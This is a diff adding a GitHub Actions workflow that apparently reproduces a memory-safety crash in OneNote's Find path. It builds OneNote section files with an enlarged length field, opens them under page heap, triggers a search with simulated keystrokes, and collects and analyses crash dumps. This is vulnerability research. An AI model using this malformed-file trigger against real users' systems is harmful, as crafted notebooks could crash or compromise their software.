@@ -1,0 +1,257 @@
+name: onenote-nbscope-pageheap-x64
+# OneNote .one find-path sink (onmain!CFindPageHitList::IsPageHit) reached through a
+# notebook-scoped Find. The notebook here is created by OneNote itself through its own
+# object model, so the section table and the section file are the same source; only the
+# 4-byte declared value length inside that section file is enlarged, in place.
+on:
+  workflow_dispatch:
+    inputs:
+      cap:
+        description: 'max carriers per run'
+        required: false
+        default: '6'
+      query:
+        description: 'search word (blank = take one from the page content)'
+        required: false
+        default: ''
+jobs:
+  t:
+    runs-on: windows-latest
+    timeout-minutes: 200
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Download ODT
+      shell: pwsh
+      run: |
+        $page = (Invoke-WebRequest -Uri "https://www.microsoft.com/en-us/download/details.aspx?id=49117" -UseBasicParsing).Content
+        if ($page -match 'href="(https://download\.microsoft\.com/download/[^"]+officedeploymenttool[^"]*\.exe)"') {
+          Invoke-WebRequest -Uri $Matches[1] -OutFile odt.exe
+        } else { throw "odt link not found" }
+        Start-Process -Wait -FilePath .\odt.exe -ArgumentList "/extract:odtx /quiet"
+
+    - name: Install x64 Office (OneNote needed)
+      shell: pwsh
+      run: |
+        $xml = '<Configuration><Add OfficeClientEdition="64" Channel="CurrentChannel"><Product ID="O365ProPlusRetail"><Language ID="en-us" /><ExcludeApp ID="OneDrive" /><ExcludeApp ID="Lync" /><ExcludeApp ID="Bing" /></Product></Add><Display Level="None" AcceptEULA="TRUE" /><Updates Enabled="FALSE" /></Configuration>'
+        Set-Content -Path cfg.xml -Value $xml
+        Start-Process -Wait -FilePath .\odtx\setup.exe -ArgumentList "/configure","cfg.xml"
+        $o = Get-Item "C:\Program Files\Microsoft Office\root\Office16\ONENOTE.EXE" -EA SilentlyContinue
+        if (-not $o) { throw "onenote install failed" }
+        $om = Get-Item "C:\Program Files\Microsoft Office\root\Office16\onmain.dll" -EA SilentlyContinue
+        "onenote v=$($o.VersionInfo.FileVersion) size=$($o.Length); onmain v=$($om.VersionInfo.FileVersion) size=$($om.Length)"
+        $om.VersionInfo.FileVersion | Out-File ver.txt
+
+    - name: Page heap for ONENOTE plus WER full dumps
+      shell: pwsh
+      run: |
+        New-Item -ItemType Directory -Force -Path out, C:\dumps | Out-Null
+        $gfs = @(Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\Debuggers" -Recurse -Include gflags.exe -EA SilentlyContinue)
+        $gf = @($gfs | Where-Object { $_.FullName -match '\\x64\\' } | Select-Object -First 1)
+        if (-not $gf) { $gf = @($gfs | Select-Object -First 1) }
+        if ($gf) { try { & $gf.FullName /p /enable ONENOTE.EXE /full | Out-Null; "gflags_path=$($gf.FullName)" | Add-Content out\setup_log.txt } catch { "gflags_unusable" | Add-Content out\setup_log.txt } }
+        $k = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ONENOTE.EXE"
+        New-Item -Path $k -Force | Out-Null
+        Set-ItemProperty -Path $k -Name GlobalFlag -Value 0x02000000 -Type DWord
+        Set-ItemProperty -Path $k -Name EnableVerifier -Value 1 -Type DWord
+        Set-ItemProperty -Path $k -Name VerifierFlags -Value 0 -Type DWord
+        Set-ItemProperty -Path $k -Name PageHeapFlags -Value 0x3 -Type DWord
+        $ld = "HKLM:\SOFTWARE\Microsoft\Windows Error Reporting\LocalDumps"
+        New-Item -Path $ld -Force | Out-Null
+        Set-ItemProperty -Path $ld -Name DumpFolder -Value "C:\dumps" -Type ExpandString
+        Set-ItemProperty -Path $ld -Name DumpType -Value 2 -Type DWord
+        Set-ItemProperty -Path $ld -Name DumpCount -Value 40 -Type DWord
+        "pageheap GlobalFlag=$((Get-ItemProperty $k).GlobalFlag) verifier=$((Get-ItemProperty $k).EnableVerifier)" | Tee-Object -FilePath out\setup_log.txt -Append
+
+    - name: Create a notebook through OneNote's own object model
+      shell: pwsh
+      run: |
+        $log = "out\nb_create.txt"
+        function L($s) { $s | Tee-Object -FilePath $log -Append }
+        $ErrorActionPreference = 'Continue'
+        $nbName = 'pocnb929'
+        $secName = 'pocsec'
+        $pageWord = 'pocword'
+        L ("start " + (Get-Date -Format s))
+        try {
+          $app = New-Object -ComObject OneNote.Application
+          $tp = $app.GetType()
+          L ("com_created type=" + $tp.FullName)
+          $m = $tp.GetMethod('CreateNewPage')
+          if ($m) {
+            $ps = $m.GetParameters()
+            L ("CreateNewPage_params=" + ((@(foreach ($p in $ps) { "$($p.ParameterType.Name) $($p.Name) out=$($p.IsOut)" })) -join ' | '))
+            $args = @()
+            foreach ($p in $ps) {
+              if ($p.IsOut -or $p.ParameterType.IsByRef) { $args += ,([ref]'') }
+              elseif ($p.ParameterType.Name -eq 'String') { $args += "$nbName\$secName\$pageWord" }
+              else { $args += [Type]::Missing }
+            }
+            try { $rv = $m.Invoke($app, $args); L ("CreateNewPage_ok rv=$rv outargs=" + ((@(foreach ($a in $args) { if ($a -is [ref]) { $a.Value } else { '-' } })) -join ';')) }
+            catch { L ("CreateNewPage_FAIL " + $_.Exception.Message) }
+          } else { L 'CreateNewPage_not_found' }
+        } catch { L ("com_FAIL " + $_.Exception.Message) }
+        Start-Sleep -Seconds 8
+        Get-Process ONENOTE -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+        Start-Sleep -Seconds 2
+        $docs = @("$env:USERPROFILE\Documents\OneNote Notebooks", "$env:USERPROFILE\OneNote Notebooks", "$env:LOCALAPPDATA\Microsooft")
+        foreach ($d in $docs) {
+          if (Test-Path $d) {
+            $f = @(Get-ChildItem $d -Recurse -File -EA SilentlyContinue)
+            L ("dir $d files=" + $f.Count + " names=" + (($f.Name | Select-Object -First 12) -join ','))
+            $one = @($f | Where-Object { $_.Extension -eq '.one' })
+            $toc = @($f | Where-Object { $_.Extension -eq '.onetoc2' })
+            L ("one_count=" + $one.Count + " toc_count=" + $toc.Count + " one_sizes=" + (($one.Length) -join ','))
+            if ($one.Count -gt 0) {
+              New-Item -ItemType Directory -Force -Path nb | Out-Null
+              Copy-Item $one[0].FullName nb\section.one -Force
+              if ($toc.Count -gt 0) { Copy-Item $toc[0].FullName nb\toc.onetoc2 -Force; L ("toc_src=" + $toc[0].FullName + " size=" + (Get-Item nb\toc.onetoc2).Length) }
+              L ("section_src=" + $one[0].FullName + " size=" + (Get-Item nb\section.one).Length + " dir=" + $one[0].DirectoryName)
+              $one[0].FullName | Out-File nb\section_path.txt
+              $one[0].Directory.FullName | Out-File nb\nb_dir.txt
+            }
+          }
+        }
+        L "done"
+
+    - name: Build carriers from that section file
+      shell: pwsh
+      run: |
+        $log = "out\nb_build.txt"
+        function L($s) { $s | Tee-Object -FilePath $log -Append }
+        if (-not (Test-Path nb\section.one)) { L 'no_section_abort'; throw 'OneNote did not create a section file' }
+        $env:PK_ONE_PER_PID = '1'
+        python ppseed\mk_pagekey_carriers.py nb\section.one nbcorpus nb 2>&1 | ForEach-Object { L $_ }
+        $files = @(Get-ChildItem nbcorpus -Filter *.one -File -EA SilentlyContinue)
+        L ("carriers=" + $files.Count + " names=" + (($files.Name | Select-Object -First 8) -join ','))
+        if ($files.Count -lt 1) { throw "carriers not materialized" }
+        $withKey = @($files | Where-Object { $_.Name -match 'p35cd' })
+        L ("with_p35cd=" + $withKey.Count)
+
+    - name: Open the notebook with each carrier and run the Find
+      shell: pwsh
+      run: |
+        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+        $sig = '[DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr h); [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr h, int n);'
+        $script:w32 = Add-Type -MemberDefinition $sig -Name W32N -Namespace N -PassThru
+        $log = "out\nb_sweep.txt"; $xlog = "out\nb_extra.txt"
+        function L($s) { $s | Tee-Object -FilePath $log -Append }
+        $ErrorActionPreference = 'Continue'
+        $cap = [int]'${{ inputs.cap }}'
+        $query = '${{ inputs.query }}'
+        $nbDir = (Get-Content nb\nb_dir.txt -EA SilentlyContinue)
+        $secPath = (Get-Content nb\section_path.txt -EA SilentlyContinue)
+        if (-not $nbDir -or -not (Test-Path $secPath)) { throw 'notebook path not recorded' }
+        $toc = @(Get-ChildItem $nbDir -Filter *.onetoc2 -File -EA SilentlyContinue)
+        if ($toc.Count -lt 1) { $toc = @(Get-ChildItem $nbDir -Recurse -Filter *.onetoc2 -File -EA SilentlyContinue) }
+        if ($toc.Count -lt 1) { throw 'no onetoc2 next to the section' }
+        L ("nbDir=$nbDir toc=$($toc[0].FullName) sec=$secPath")
+        if (-not $query) {
+          $txt = [Text.Encoding]::Unicode.GetString([IO.File]::ReadAllBytes($secPath))
+          $w = [regex]::Matches($txt, '[A-Za-z][A-Za-z0-9]{4,}') | ForEach-Object { $_.Value } | Select-Object -Unique
+          if ($w) { $query = @($w)[0] } else { $query = 'page' }
+          L ("query_autopicked=$query candidates=" + ((@($w) | Select-Object -First 8) -join ','))
+        }
+        $files = @(Get-ChildItem nbcorpus -Filter *.one -File | Sort-Object Name | Select-Object -First $cap)
+        if ($files.Count -lt 1) { throw "corpus empty" }
+        $orig = [IO.File]::ReadAllBytes($secPath)
+        L ("cases=$($files.Count) query=$query")
+        $unopened = @(); $nosend = @(); $dtotal = 0
+        foreach ($f in $files) {
+          Get-Process ONENOTE -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+          Start-Sleep -Seconds 2
+          [IO.File]::WriteAllBytes($secPath, [IO.File]::ReadAllBytes($f.FullName))
+          foreach ($t in @($toc[0].FullName, $secPath)) {
+            Set-Content -Path $t -Stream Zone.Identifier -Value "[ZoneTransfer]`r`nZoneId=3" -Encoding ASCII -EA SilentlyContinue
+          }
+          $streams = @(Get-Item $secPath -Stream * -EA SilentlyContinue).Stream -join ','
+          $t0 = Get-Date
+          $p = Start-Process $toc[0].FullName -PassThru
+          $title = ''; $opened = 0
+          for ($i = 0; $i -lt 40; $i++) {
+            Start-Sleep -Milliseconds 500
+            $w = @(Get-Process ONENOTE -EA SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 })
+            if ($w.Count -gt 0 -and $w[0].MainWindowTitle) { $title = $w[0].MainWindowTitle; $opened = 1; break }
+          }
+          if (-not $opened) { $unopened += $f.Name }
+          $sent = 0; $alive = 1; $exit = ''
+          if ($opened) {
+            try {
+              [void]$script:w32::ShowWindowAsync($w[0].MainWindowHandle, 9)
+              [void]$script:w32::SetForegroundWindow($w[0].MainWindowHandle)
+              Start-Sleep -Milliseconds 600
+              [System.Windows.Forms.SendKeys]::SendWait('^e'); Start-Sleep -Milliseconds 1500
+              [System.Windows.Forms.SendKeys]::SendWait($query); Start-Sleep -Milliseconds 900
+              [System.Windows.Forms.SendKeys]::SendWait('{ENTER}'); Start-Sleep -Seconds 5
+              $sent = 1
+            } catch { "sendkeys_fail $($f.Name) " + $_.Exception.Message | Add-Content $xlog }
+            $h = @($w[0].MainWindowHandle)
+            for ($i = 0; $i -lt 3; $i++) {
+              Start-Sleep -Seconds 3
+              $pr = @(Get-Process ONENOTE -EA SilentlyContinue)
+              if ($pr.Count -eq 0) { try { $exit = '0x' + ('{0:x8}' -f $p.ExitCode) } catch { $exit = '?' }; $alive = 0; break }
+            }
+            if ($alive -eq 1) {
+              try {
+                [void]$script:w32::SetForegroundWindow($h[0]); Start-Sleep -Milliseconds 500
+                [System.Windows.Forms.SendKeys]::SendWait('^e'); Start-Sleep -Milliseconds 1200
+                [System.Windows.Forms.SendKeys]::SendWait($query); Start-Sleep -Milliseconds 900
+                [System.Windows.Forms.SendKeys]::SendWait('{ENTER}'); Start-Sleep -Seconds 6
+              } catch { "sendkeys2_fail $($f.Name) " + $_.Exception.Message | Add-Content $xlog }
+            }
+            $pr = @(Get-Process ONENOTE -EA SilentlyContinue)
+            if ($pr.Count -gt 0) { "win title=$($pr[0].MainWindowTitle)" | Add-Content $xlog }
+          } else { $nosend += $f.Name }
+          $newD = @(Get-ChildItem C:\dumps -File -EA SilentlyContinue)
+          $dtotal += $newD.Count
+          L ('{0,-30} opened={1} sent={2} alive={3} exit={4} dumps={5} s={6} streams={7} title={8}' -f $f.Name, $opened, $sent, $alive, $exit, $newD.Count, [int]((Get-Date) - $t0).TotalSeconds, $streams, $title)
+          Get-Process ONENOTE -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+          Start-Sleep -Seconds 2
+          $newD | ForEach-Object { Copy-Item $_.FullName ("out\bad\" + $f.Name + '_' + $_.Name) -Force -EA SilentlyContinue }
+        }
+        [IO.File]::WriteAllBytes($secPath, $orig)
+        "SUMMARY cases=$($files.Count) dumps_total=$dtotal" | L
+        "unopened=$($unopened.Count) [$($unopened -join ' ')]" | L
+        "nosend=$($nosend.Count) [$($nosend -join ' ')]" | L
+        New-Item -ItemType Directory -Force -Path out\bad | Out-Null
+        Get-ChildItem C:\dumps -File -EA SilentlyContinue | ForEach-Object { Copy-Item $_.FullName ("out\bad\" + $_.Name) -Force }
+        if ($dtotal -eq 0 -and $unopened.Count -eq $files.Count) { throw "no notebook window came up for any case" }
+
+    - name: Attribute any dump to onmain
+      shell: pwsh
+      run: |
+        New-Item -ItemType Directory -Force -Path out | Out-Null
+        $cdb = @(Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\Debuggers" -Recurse -Include cdb.exe -EA SilentlyContinue | Where-Object { $_.FullName -match '\\x64\\' } | Select-Object -First 1)
+        "cdb=$($cdb.FullName)" | Out-File out\attribution.txt
+        $d = @(Get-ChildItem out\bad -File -EA SilentlyContinue)
+        "dumps=$($d.Count)" | Add-Content out\attribution.txt
+        foreach ($x in $d) {
+          "===== $($x.Name) size=$($x.Length)" | Add-Content out\attribution.txt
+          if ($cdb) {
+            & $cdb.FullName -z $x.FullName -c "!analyze -v; k 12; .ecxr; r; dq @sp L8; lmvm onmain" 2>&1 | Select-Object -First 90 | Add-Content out\attribution.txt
+          }
+        }
+
+    - name: Report
+      shell: pwsh
+      run: |
+        if (Test-Path ver.txt) { Get-Content ver.txt }
+        Get-ChildItem out -File -EA SilentlyContinue | ForEach-Object { "out\" + $_.Name + " " + $_.Length + "B" }
+        if (Test-Path out\nb_sweep.txt) { Get-Content out\nb_sweep.txt | Select-Object -Last 12 }
+        if (Test-Path out\nb_create.txt) { Get-Content out\nb_create.txt | Select-Object -Last 12 }
+
+    - name: Collect evidence into workspace
+      shell: pwsh
+      run: |
+        New-Item -ItemType Directory -Force -Path evid | Out-Null
+        Copy-Item out\* evid\ -Recurse -Force -EA SilentlyContinue
+        Copy-Item -Path nb -Destination evid\nb -Recurse -Force -EA SilentlyContinue
+        if (Test-Path ver.txt) { Copy-Item ver.txt evid\ver.txt -Force }
+
+    - name: Upload evidence
+      uses: actions/upload-artifact@v4
+      if: always()
+      with:
+        name: onenote-nbscope
+        path: |
+          evid
